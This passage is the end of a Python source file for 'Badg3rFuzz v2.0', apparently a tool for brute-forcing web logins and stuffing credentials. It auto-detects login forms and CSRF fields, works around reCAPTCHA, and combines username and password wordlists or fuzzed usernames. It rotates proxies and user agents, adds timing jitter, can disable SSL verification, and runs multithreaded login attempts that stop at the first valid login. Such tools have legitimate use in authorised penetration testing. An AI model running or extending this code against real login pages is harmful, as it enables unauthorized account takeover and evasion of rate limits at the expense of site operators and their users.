    temp_certs = glob.glob('/tmp/badg3r_cert_*.pem') + glob.glob(os.path.join(tempfile.gettempdir(), 'badg3r_cert_*.pem'))
    for cert_file in temp_certs:
        try:
            os.remove(cert_file)
        except:
            pass

async def run_auto_detection(login_url, browser_type, verbose):
    """Run auto-detection in async context"""
    try:
        auto_detected = await auto_detect_form_structure(login_url, browser_type, verbose)
        
        # Try CSRF interception if we have a post URL
        if auto_detected.get('post_url'):
            csrf_data = await intercept_csrf_request(login_url, auto_detected['post_url'], browser_type, verbose)
            auto_detected['csrf_data'] = csrf_data
        
        return auto_detected
    except Exception as e:
        if verbose:
            safe_print_lock(f"{RED}[!] Auto-detection failed: {e}{RESET}")
        return {}

def main():
    # Configurar handlers de señales
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    parser = argparse.ArgumentParser(description="Badg3rFuzz v2.0 - Advanced Fuzzer/Brute Force with reCAPTCHA + Auto-Detection")
    
    # Original arguments
    parser.add_argument("--success-indicators", nargs='+', default=[], help="Additional success patterns to look for in response (case insensitive)")
    parser.add_argument("--fail-indicators", nargs='+', default=[], help="Additional failure patterns to look for in response (case insensitive)")
    parser.add_argument("--success-codes", nargs='+', type=int, default=[302], help="HTTP codes that indicate success")
    parser.add_argument("--delay", type=float, default=0, help="Base delay between requests in seconds")
    parser.add_argument("--jitter", type=float, default=0, help="Random jitter 0-X seconds added to delay")
    parser.add_argument("--user-agents-file", help="File with user agents list for rotation")
    parser.add_argument("--check-cookies", action="store_true", default=True, help="Check for session cookies as success indicator")
    parser.add_argument("--site-key", help="Site key del reCaptcha")
    parser.add_argument("--captcha-action", help="Action del reCaptcha")
    parser.add_argument("--login-url", required=True, help="URL donde se carga el captcha (frontend)")
    parser.add_argument("--post-url", help="URL para POST login")
    parser.add_argument("--pass-file", help="Archivo con passwords uno por línea")
    parser.add_argument("--user-file", help="Archivo con usuarios uno por línea")
    parser.add_argument("--user-fuzz", help="Fuzzer para usuarios tipo:min_len:max_len:cantidad (ejemplo digits:6:6:100)")
    parser.add_argument("--threads", type=int, default=5, help="Cantidad de hilos (default 5)")
    parser.add_argument("--stop-on-success", action="store_true", help="Detener al primer login válido")
    parser.add_argument("--origin-url", help="URL para la cabecera Origin (opcional)")
    parser.add_argument("--no-banner", action="store_true", help="Desactiva el banner genial de badg3rscan", default=False)
    parser.add_argument("--webdriver", choices=["chrome", "firefox"], default="firefox", help="Browser engine: chrome o firefox (default firefox)")
    parser.add_argument("--verbose", action="store_true", help="Activa impresión detallada", default=False)
    parser.add_argument("--proxy", help="Proxy único formato http://user:pass@host:port o http://host:port")
    parser.add_argument("--proxy-file", help="Archivo con lista de proxies (uno por línea)")
    parser.add_argument("--proxy-timeout", type=int, default=20, help="Timeout para conexiones proxy en segundos")
    parser.add_argument("--disable-ssl-verify", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--ca-cert", help="Path to CA certificate file to add to trust chain")
    
    # New v2.0 arguments
    parser.add_argument("--attack-mode", choices=["auto", "sniper", "gutling"], default="auto", help="Attack mode: auto (cartesian), sniper (systematic), gutling (single list)")
    parser.add_argument("--custom-structure", help="Custom request structure with ^USER^, ^PASS^, ^EMAIL^, ^CAPTCHA^, ^TOKEN1^ patterns")
    parser.add_argument("--email-file", help="File with email addresses for attacks")
    parser.add_argument("--yes", action="store_true", help="Auto-accept all prompts and use auto-detected values")
    parser.add_argument("--no-auto-detect", action="store_true", help="Disable auto-detection and use only manual parameters")
    
    args = parser.parse_args()
    
    if args.no_banner == False:
        print_banner()
    else:
        t = datetime.now()
        print(f"{WHITE}{BOLD}🦡 Badg3rFuzz v2.0 {RESET}")
        print(f"{BLUE}Inicio: {t.strftime('%d-%m-%Y %H:%M:%S')}{RESET}")

    # Auto-detection phase
    auto_detected = {}
    if not args.no_auto_detect:
        print(f"[>] Running auto-detection on {args.login_url}...")
        
        # Create event loop for auto-detection
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            auto_detected = loop.run_until_complete(
                run_auto_detection(args.login_url, args.webdriver, args.verbose)
            )
            
            if auto_detected:
                print(f"{GREEN}[✔] Auto-detection completed!{RESET}")
                if auto_detected.get('site_key'):
                    print(f"    Site-key: {auto_detected['site_key']}")
                if auto_detected.get('post_url'):
                    print(f"    POST URL: {auto_detected['post_url']}")
                if auto_detected.get('captcha_action'):
                    print(f"    Captcha Action: {auto_detected['captcha_action']}")
                if auto_detected.get('form_fields'):
                    print(f"    Form fields: {len(auto_detected['form_fields'])} detected")
            else:
                print(f"{YELLOW}[!] Auto-detection failed, using manual parameters{RESET}")
                
        except Exception as e:
            print(f"{RED}[!] Auto-detection error: {e}{RESET}")
        finally:
            loop.close()
    
    # Validate and merge configuration
    config_choice = 'manual'
    if auto_detected and not args.no_auto_detect:
        config_choice = validate_and_prompt_detection(auto_detected, args, args.yes)
    
    # Apply chosen configuration
    if config_choice == 'auto' and auto_detected:
        final_site_key = auto_detected.get('site_key') or args.site_key
        final_post_url = auto_detected.get('post_url') or args.post_url
        final_captcha_action = auto_detected.get('captcha_action') or args.captcha_action
        
        # Use intercepted structure if available
        if auto_detected.get('csrf_data') and not args.custom_structure:
            csrf_data = auto_detected['csrf_data']
            if csrf_data.get('form_data'):
                # Build custom structure from intercepted data
                structure_parts = []
                for field, value in csrf_data['form_data'].items():
                    if 'user' in field.lower() or 'email' in field.lower():
                        structure_parts.append(f"{field}=^USER^")
                    elif 'pass' in field.lower():
                        structure_parts.append(f"{field}=^PASS^")
                    elif 'captcha' in field.lower() or 'token' in field.lower():
                        structure_parts.append(f"{field}=^CAPTCHA^")
                    else:
                        structure_parts.append(f"{field}={value}")
                
                if structure_parts:
                    args.custom_structure = "&".join(structure_parts)
                    if args.verbose:
                        print(f"[AUTO] Generated structure: {args.custom_structure}")
    else:
        final_site_key = args.site_key
        final_post_url = args.post_url
        final_captcha_action = args.captcha_action
    
    # Validate required parameters
    if not final_site_key:
        print(f"{RED}[!] Error: --site-key is required and could not be auto-detected{RESET}")
        sys.exit(1)
    
    if not final_post_url:
        print(f"{RED}[!] Error: --post-url is required and could not be auto-detected{RESET}")
        sys.exit(1)
    
    if not final_captcha_action:
        print(f"{YELLOW}[!] Warning: --captcha-action not provided, using 'login' as default{RESET}")
        final_captcha_action = "login"

    # Prepare combinations and emails
    emails = preparar_combos(args.user_file, args.pass_file, args.user_fuzz, args.attack_mode, args.email_file)
    
    print(f"[>] Loading fuzzing payloads and brute force wordlists...")
    print(f"[>] {combo_queue.qsize()} combinations prepared.")
    print(f"[>] Attack mode: {args.attack_mode.upper()}")
    
    global total_attempts
    total_attempts = combo_queue.qsize()

    # Cargar proxies
    proxies_list = cargar_proxies(args.proxy_file, args.proxy)
    if proxies_list:
        print(f"[>] {len(proxies_list)} proxies loaded")
    else:
        print("[>] No proxies setup - Direct connection")
    
    # Setup logging
    script_dir = os.path.dirname(os.path.abspath(__file__))
    logs_dir = os.path.join(script_dir, "logs")
    os.makedirs("logs", exist_ok=True)
    log_filename = os.path.join(logs_dir, f"fuzzlog-{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.log")

    start_time = datetime.now()
    print(f"[>] Ready to fuzz and bruteforce your targets! 🦡💥")
    print(f"[>] Starting {args.threads} threads...")
    time.sleep(1)  # pause for visual
    print(f"[>] Fuzzing in progress...")
    threads = []
    
    # Preparar patrones combinados
    combined_success = get_combined_patterns(args.success_indicators, "success")
    combined_fail = get_combined_patterns(args.fail_indicators, "fail")
    
    try:
        # Crear threads worker (sin iniciar aún)
        for _ in range(args.threads):
            t = threading.Thread(target=worker, args=(
                final_site_key,
                final_captcha_action,
                args.login_url,
                final_post_url,
                args.origin_url,
                args.stop_on_success,
                log_filename,
                args.webdriver,
                args.verbose,
                combined_success,
                combined_fail,
                args.success_codes,
                args.check_cookies,
                args.delay,
                args.jitter,
                args.user_agents_file,
                proxies_list,
                args.proxy_timeout,
                args.disable_ssl_verify,
                args.ca_cert,
                args.attack_mode,
                args.custom_structure,
                emails
            ))
            t.daemon = False
            threads.append(t)

        # Pausa para inicialización limpia
        time.sleep(0.5)

        # Iniciar todos los threads worker
        for t in threads:
            t.start()
            time.sleep(0.1)  # Pequeño delay entre inicios
        
        # Iniciar barra de progreso DESPUÉS de los workers
        barra_thread = threading.Thread(target=mostrar_barra_progreso, daemon=True)
        barra_thread.start()
        
        # Esperar finalización con timeout agresivo
        start_wait = time.time()
        max_wait_time = 300  # 5 minutos máximo

        while not stop_event.is_set() and not success_flag.is_set():
            # Verificar si todos los threads terminaron naturalmente
            all_done = all(not t.is_alive() for t in threads)
            
            # Verificar si la cola está vacía
            queue_empty = combo_queue.empty()
            
            # Verificar timeout general
            elapsed = time.time() - start_wait
            
            if all_done or queue_empty or elapsed > max_wait_time:
                break
                
            time.sleep(0.5)
        
        # Esperar threads con timeout corto
        wait_for_threads(threads, timeout=2)
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Ctrl+C Detected...{RESET}")
        stop_event.set()
    finally:
        stop_event.set()
        cleanup_and_exit(threads, start_time)
        cleanup_temp_certs()
        os._exit(0)  # Salida forzada inmediata

if __name__ == "__main__": # pragma: no cover
   main()